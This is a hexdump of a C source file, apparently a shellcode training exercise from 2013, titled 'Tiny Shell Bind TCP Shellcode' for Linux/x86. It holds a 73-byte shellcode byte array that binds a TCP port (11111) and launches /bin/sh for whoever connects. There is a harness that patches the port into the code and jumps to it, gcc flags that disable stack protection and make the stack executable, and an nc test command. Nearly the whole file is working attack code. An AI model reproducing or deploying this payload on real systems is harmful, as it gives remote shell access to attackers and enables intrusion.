00000000  2f 2a 0a 0a 20 54 69 6e  79 20 53 68 65 6c 6c 20  |/*.. Tiny Shell |
00000010  42 69 6e 64 20 54 43 50  20 53 68 65 6c 6c 63 6f  |Bind TCP Shellco|
00000020  64 65 20 2d 20 43 20 4c  61 6e 67 75 61 67 65 0a  |de - C Language.|
00000030  20 4c 69 6e 75 78 2f 78  38 36 0a 0a 20 57 72 69  | Linux/x86.. Wri|
00000040  74 74 65 6e 20 69 6e 20  32 30 31 33 20 62 79 20  |tten in 2013 by |
00000050  47 65 79 73 6c 61 6e 20  47 2e 20 42 65 6d 2c 20  |Geyslan G. Bem, |
00000060  48 61 63 6b 69 6e 67 20  62 69 74 73 0a 0a 20 20  |Hacking bits..  |
00000070  20 68 74 74 70 3a 2f 2f  68 61 63 6b 69 6e 67 62  | http://hackingb|
00000080  69 74 73 2e 63 6f 6d 0a  20 20 20 67 65 79 73 6c  |its.com.   geysl|
00000090  61 6e 40 67 6d 61 69 6c  2e 63 6f 6d 0a 0a 20 54  |an@gmail.com.. T|
000000a0  68 69 73 20 73 6f 75 72  63 65 20 69 73 20 6c 69  |his source is li|
000000b0  63 65 6e 73 65 64 20 75  6e 64 65 72 20 74 68 65  |censed under the|
000000c0  20 43 72 65 61 74 69 76  65 20 43 6f 6d 6d 6f 6e  | Creative Common|
000000d0  73 0a 20 41 74 74 72 69  62 75 74 69 6f 6e 2d 53  |s. Attribution-S|
000000e0  68 61 72 65 41 6c 69 6b  65 20 33 2e 30 20 42 72  |hareAlike 3.0 Br|
000000f0  61 7a 69 6c 20 4c 69 63  65 6e 73 65 2e 0a 0a 20  |azil License... |
00000100  54 6f 20 76 69 65 77 20  61 20 63 6f 70 79 20 6f  |To view a copy o|
00000110  66 20 74 68 69 73 20 6c  69 63 65 6e 73 65 2c 20  |f this license, |
00000120  76 69 73 69 74 0a 0a 20  20 20 68 74 74 70 3a 2f  |visit..   http:/|
00000130  2f 63 72 65 61 74 69 76  65 63 6f 6d 6d 6f 6e 73  |/creativecommons|
00000140  2e 6f 72 67 2f 6c 69 63  65 6e 73 65 73 2f 62 79  |.org/licenses/by|
00000150  2d 73 61 2f 33 2e 30 2f  0a 0a 20 59 6f 75 20 61  |-sa/3.0/.. You a|
00000160  72 65 20 66 72 65 65 3a  0a 0a 20 20 20 20 74 6f  |re free:..    to|
00000170  20 53 68 61 72 65 20 2d  20 74 6f 20 63 6f 70 79  | Share - to copy|
00000180  2c 20 64 69 73 74 72 69  62 75 74 65 20 61 6e 64  |, distribute and|
00000190  20 74 72 61 6e 73 6d 69  74 20 74 68 65 20 77 6f  | transmit the wo|
000001a0  72 6b 0a 20 20 20 20 74  6f 20 52 65 6d 69 78 20  |rk.    to Remix |
000001b0  2d 20 74 6f 20 61 64 61  70 74 20 74 68 65 20 77  |- to adapt the w|
000001c0  6f 72 6b 0a 20 20 20 20  74 6f 20 6d 61 6b 65 20  |ork.    to make |
000001d0  63 6f 6d 6d 65 72 63 69  61 6c 20 75 73 65 20 6f  |commercial use o|
000001e0  66 20 74 68 65 20 77 6f  72 6b 0a 0a 20 55 6e 64  |f the work.. Und|
000001f0  65 72 20 74 68 65 20 66  6f 6c 6c 6f 77 69 6e 67  |er the following|
00000200  20 63 6f 6e 64 69 74 69  6f 6e 73 3a 0a 20 20 20  | conditions:.   |
00000210  41 74 74 72 69 62 75 74  69 6f 6e 20 2d 20 59 6f  |Attribution - Yo|
00000220  75 20 6d 75 73 74 20 61  74 74 72 69 62 75 74 65  |u must attribute|
00000230  20 74 68 65 20 77 6f 72  6b 20 69 6e 20 74 68 65  | the work in the|
00000240  20 6d 61 6e 6e 65 72 0a  20 20 20 20 20 20 20 20  | manner.        |
00000250  20 20 20 20 20 20 20 20  20 73 70 65 63 69 66 69  |         specifi|
00000260  65 64 20 62 79 20 74 68  65 20 61 75 74 68 6f 72  |ed by the author|
00000270  20 6f 72 20 6c 69 63 65  6e 73 6f 72 20 28 62 75  | or licensor (bu|
00000280  74 0a 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |t.              |
00000290  20 20 20 6e 6f 74 20 69  6e 20 61 6e 79 20 77 61  |   not in any wa|
000002a0  79 20 74 68 61 74 20 73  75 67 67 65 73 74 73 20  |y that suggests |
000002b0  74 68 61 74 20 74 68 65  79 0a 20 20 20 20 20 20  |that they.      |
000002c0  20 20 20 20 20 20 20 20  20 20 20 65 6e 64 6f 72  |           endor|
000002d0  73 65 20 79 6f 75 20 6f  72 20 79 6f 75 72 20 75  |se you or your u|
000002e0  73 65 20 6f 66 20 74 68  65 20 77 6f 72 6b 29 2e  |se of the work).|
000002f0  0a 0a 20 20 20 53 68 61  72 65 20 41 6c 69 6b 65  |..   Share Alike|
00000300  20 2d 20 49 66 20 79 6f  75 20 61 6c 74 65 72 2c  | - If you alter,|
00000310  20 74 72 61 6e 73 66 6f  72 6d 2c 20 6f 72 20 62  | transform, or b|
00000320  75 69 6c 64 20 75 70 6f  6e 0a 20 20 20 20 20 20  |uild upon.      |
00000330  20 20 20 20 20 20 20 20  20 20 20 74 68 69 73 20  |           this |
00000340  77 6f 72 6b 2c 20 79 6f  75 20 6d 61 79 20 64 69  |work, you may di|
00000350  73 74 72 69 62 75 74 65  20 74 68 65 0a 20 20 20  |stribute the.   |
00000360  20 20 20 20 20 20 20 20  20 20 20 20 20 20 72 65  |              re|
00000370  73 75 6c 74 69 6e 67 20  77 6f 72 6b 20 6f 6e 6c  |sulting work onl|
00000380  79 20 75 6e 64 65 72 20  74 68 65 20 73 61 6d 65  |y under the same|
00000390  20 6f 72 0a 20 20 20 20  20 20 20 20 20 20 20 20  | or.            |
000003a0  20 20 20 20 20 73 69 6d  69 6c 61 72 20 6c 69 63  |     similar lic|
000003b0  65 6e 73 65 20 74 6f 20  74 68 69 73 20 6f 6e 65  |ense to this one|
000003c0  2e 0a 0a 2a 2f 0a 0a 2f  2a 0a 0a 20 74 69 6e 79  |...*/../*.. tiny|
000003d0  5f 73 68 65 6c 6c 5f 62  69 6e 64 5f 74 63 70 5f  |_shell_bind_tcp_|
000003e0  73 68 65 6c 6c 63 6f 64  65 0a 0a 20 2a 20 37 33  |shellcode.. * 73|
000003f0  20 62 79 74 65 73 0a 20  2a 20 6e 75 6c 6c 2d 66  | bytes. * null-f|
00000400  72 65 65 20 69 66 20 74  68 65 20 70 6f 72 74 20  |ree if the port |
00000410  69 73 0a 0a 0a 20 23 20  67 63 63 20 2d 6d 33 32  |is... # gcc -m32|
00000420  20 2d 66 6e 6f 2d 73 74  61 63 6b 2d 70 72 6f 74  | -fno-stack-prot|
00000430  65 63 74 6f 72 20 2d 7a  20 65 78 65 63 73 74 61  |ector -z execsta|
00000440  63 6b 20 74 69 6e 79 5f  73 68 65 6c 6c 5f 62 69  |ck tiny_shell_bi|
00000450  6e 64 5f 74 63 70 5f 73  68 65 6c 6c 63 6f 64 65  |nd_tcp_shellcode|
00000460  2e 63 20 2d 6f 20 74 69  6e 79 5f 73 68 65 6c 6c  |.c -o tiny_shell|
00000470  5f 62 69 6e 64 5f 74 63  70 5f 73 68 65 6c 6c 63  |_bind_tcp_shellc|
00000480  6f 64 65 0a 0a 20 54 65  73 74 69 6e 67 0a 20 23  |ode.. Testing. #|
00000490  20 2e 2f 74 69 6e 79 5f  73 68 65 6c 6c 5f 62 69  | ./tiny_shell_bi|
000004a0  6e 64 5f 74 63 70 5f 73  68 65 6c 6c 63 6f 64 65  |nd_tcp_shellcode|
000004b0  0a 20 23 20 6e 63 20 31  32 37 2e 30 2e 30 2e 31  |. # nc 127.0.0.1|
000004c0  20 31 31 31 31 31 0a 0a  2a 2f 0a 0a 0a 23 69 6e  | 11111..*/...#in|
000004d0  63 6c 75 64 65 20 3c 73  74 64 69 6f 2e 68 3e 0a  |clude <stdio.h>.|
000004e0  23 69 6e 63 6c 75 64 65  20 3c 73 74 72 69 6e 67  |#include <string|
000004f0  2e 68 3e 0a 0a 75 6e 73  69 67 6e 65 64 20 63 68  |.h>..unsigned ch|
00000500  61 72 20 63 6f 64 65 5b  5d 20 3d 20 5c 0a 0a 22  |ar code[] = \.."|
00000510  5c 78 33 31 5c 78 64 62  5c 78 66 37 5c 78 65 33  |\x31\xdb\xf7\xe3|
00000520  5c 78 62 30 5c 78 36 36  5c 78 34 33 5c 78 35 32  |\xb0\x66\x43\x52|
00000530  5c 78 35 33 5c 78 36 61  22 0a 22 5c 78 30 32 5c  |\x53\x6a"."\x02\|
00000540  78 38 39 5c 78 65 31 5c  78 63 64 5c 78 38 30 5c  |x89\xe1\xcd\x80\|
00000550  78 35 62 5c 78 35 65 5c  78 35 32 5c 78 36 36 5c  |x5b\x5e\x52\x66\|
00000560  78 36 38 22 0a 22 5c 78  32 62 5c 78 36 37 5c 78  |x68"."\x2b\x67\x|
00000570  36 61 5c 78 31 30 5c 78  35 31 5c 78 35 30 5c 78  |6a\x10\x51\x50\x|
00000580  62 30 5c 78 36 36 5c 78  38 39 5c 78 65 31 22 0a  |b0\x66\x89\xe1".|
00000590  22 5c 78 63 64 5c 78 38  30 5c 78 38 39 5c 78 35  |"\xcd\x80\x89\x5|
000005a0  31 5c 78 30 34 5c 78 62  30 5c 78 36 36 5c 78 62  |1\x04\xb0\x66\xb|
000005b0  33 5c 78 30 34 5c 78 63  64 22 0a 22 5c 78 38 30  |3\x04\xcd"."\x80|
000005c0  5c 78 62 30 5c 78 36 36  5c 78 34 33 5c 78 63 64  |\xb0\x66\x43\xcd|
000005d0  5c 78 38 30 5c 78 35 39  5c 78 39 33 5c 78 36 61  |\x80\x59\x93\x6a|
000005e0  5c 78 33 66 22 0a 22 5c  78 35 38 5c 78 63 64 5c  |\x3f"."\x58\xcd\|
000005f0  78 38 30 5c 78 34 39 5c  78 37 39 5c 78 66 38 5c  |x80\x49\x79\xf8\|
00000600  78 62 30 5c 78 30 62 5c  78 36 38 5c 78 32 66 22  |xb0\x0b\x68\x2f"|
00000610  0a 22 5c 78 32 66 5c 78  37 33 5c 78 36 38 5c 78  |."\x2f\x73\x68\x|
00000620  36 38 5c 78 32 66 5c 78  36 32 5c 78 36 39 5c 78  |68\x2f\x62\x69\x|
00000630  36 65 5c 78 38 39 5c 78  65 33 22 0a 22 5c 78 34  |6e\x89\xe3"."\x4|
00000640  31 5c 78 63 64 5c 78 38  30 22 3b 0a 0a 6d 61 69  |1\xcd\x80";..mai|
00000650  6e 20 28 29 0a 7b 0a 0a  20 20 20 20 20 20 20 20  |n ().{..        |
00000660  2f 2f 20 57 68 65 6e 20  74 68 65 20 50 6f 72 74  |// When the Port|
00000670  20 63 6f 6e 74 61 69 6e  73 20 6e 75 6c 6c 20 62  | contains null b|
00000680  79 74 65 73 2c 20 70 72  69 6e 74 66 20 77 69 6c  |ytes, printf wil|
00000690  6c 20 73 68 6f 77 20 61  20 77 72 6f 6e 67 20 73  |l show a wrong s|
000006a0  68 65 6c 6c 63 6f 64 65  20 6c 65 6e 67 74 68 2e  |hellcode length.|
000006b0  0a 0a 09 70 72 69 6e 74  66 28 22 53 68 65 6c 6c  |...printf("Shell|
000006c0  63 6f 64 65 20 4c 65 6e  67 74 68 3a 20 20 25 64  |code Length:  %d|
000006d0  5c 6e 22 2c 20 73 74 72  6c 65 6e 28 63 6f 64 65  |\n", strlen(code|
000006e0  29 29 3b 0a 0a 09 2f 2f  20 50 6f 6c 6c 75 74 65  |));...// Pollute|
000006f0  73 20 61 6c 6c 20 72 65  67 69 73 74 65 72 73 20  |s all registers |
00000700  65 6e 73 75 72 69 6e 67  20 74 68 61 74 20 74 68  |ensuring that th|
00000710  65 20 73 68 65 6c 6c 63  6f 64 65 20 72 75 6e 73  |e shellcode runs|
00000720  20 69 6e 20 61 6e 79 20  63 69 72 63 75 6d 73 74  | in any circumst|
00000730  61 6e 63 65 2e 0a 0a 09  5f 5f 61 73 6d 5f 5f 20  |ance....__asm__ |
00000740  28 22 6d 6f 76 6c 20 24  30 78 66 66 66 66 66 66  |("movl $0xffffff|
00000750  66 66 2c 20 25 65 61 78  5c 6e 5c 74 22 0a 09 09  |ff, %eax\n\t"...|
00000760  20 22 6d 6f 76 6c 20 25  65 61 78 2c 20 25 65 62  | "movl %eax, %eb|
00000770  78 5c 6e 5c 74 22 0a 09  09 20 22 6d 6f 76 6c 20  |x\n\t"... "movl |
00000780  25 65 61 78 2c 20 25 65  63 78 5c 6e 5c 74 22 0a  |%eax, %ecx\n\t".|
00000790  09 09 20 22 6d 6f 76 6c  20 25 65 61 78 2c 20 25  |.. "movl %eax, %|
000007a0  65 64 78 5c 6e 5c 74 22  0a 09 09 20 22 6d 6f 76  |edx\n\t"... "mov|
000007b0  6c 20 25 65 61 78 2c 20  25 65 73 69 5c 6e 5c 74  |l %eax, %esi\n\t|
000007c0  22 0a 09 09 20 22 6d 6f  76 6c 20 25 65 61 78 2c  |"... "movl %eax,|
000007d0  20 25 65 64 69 5c 6e 5c  74 22 0a 09 09 20 22 6d  | %edi\n\t"... "m|
000007e0  6f 76 6c 20 25 65 61 78  2c 20 25 65 62 70 5c 6e  |ovl %eax, %ebp\n|
000007f0  5c 74 22 0a 0a 09 2f 2f  20 53 65 74 74 69 6e 67  |\t"...// Setting|
00000800  20 74 68 65 20 70 6f 72  74 0a 09 09 20 22 6d 6f  | the port... "mo|
00000810  76 77 20 24 30 78 36 37  32 62 2c 20 28 63 6f 64  |vw $0x672b, (cod|
00000820  65 2b 32 30 29 5c 6e 5c  74 22 0a 0a 09 2f 2f 20  |e+20)\n\t"...// |
00000830  43 61 6c 6c 69 6e 67 20  74 68 65 20 73 68 65 6c  |Calling the shel|
00000840  6c 63 6f 64 65 0a 09 09  20 22 63 61 6c 6c 20 63  |lcode... "call c|
00000850  6f 64 65 22 29 3b 0a 0a  7d                       |ode");..}|
00000859
